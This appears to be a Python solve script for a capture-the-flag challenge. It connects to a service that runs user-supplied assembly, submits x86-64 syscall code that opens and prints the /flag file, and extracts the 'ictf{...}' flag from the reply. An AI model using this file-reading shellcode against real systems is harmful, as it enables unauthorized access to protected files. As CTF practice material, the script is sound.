#!/usr/bin/env python3
import re
import socket
import sys

def main() -> None:
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} HOST PORT", file=sys.stderr)
        raise SystemExit(2)

    host = sys.argv[1]
    port = int(sys.argv[2])

    prompt = b"Enter your assembly code (end with an empty line):"

    sock = socket.create_connection((host, port), timeout=10)
    sock.settimeout(10)

    # Receive banner up to the prompt.
    buf = b""
    while prompt not in buf:
        chunk = sock.recv(4096)
        if not chunk:
            break
        buf += chunk
        if len(buf) > 1024 * 1024:
            break

    # Assembly to open, read, and print the /flag file.
    asm = """\
mov rdi, flag_str
mov rax, 2              ; syscall: open
xor rsi, rsi
xor rdx, rdx
syscall
mov rdi, rax            ; fd
mov rsi, flag_buf
mov rdx, 100
mov rax, 0              ; syscall: read
syscall
mov rdi, 1              ; stdout
mov rsi, flag_buf
mov rdx, 100
mov rax, 1              ; syscall: write
syscall
mov rax, 60             ; syscall: exit
xor rdi, rdi
syscall
section .data
flag_str db "/flag", 0
flag_buf times 100 db 0
""".strip("\n")

    # The service reads line-by-line and stops on an empty line.
    sock.sendall((asm + "\n\n").encode())

    out = b""
    while True:
        try:
            chunk = sock.recv(4096)
        except socket.timeout:
            break
        if not chunk:
            break
        out += chunk

    m = re.search(rb"ictf\{[^}]+\}", out)
    if m:
        print(m.group(0).decode())
    else:
        # Fallback: dump full output for debugging.
        print(out.decode(errors="replace"))


if __name__ == "__main__":
    main()




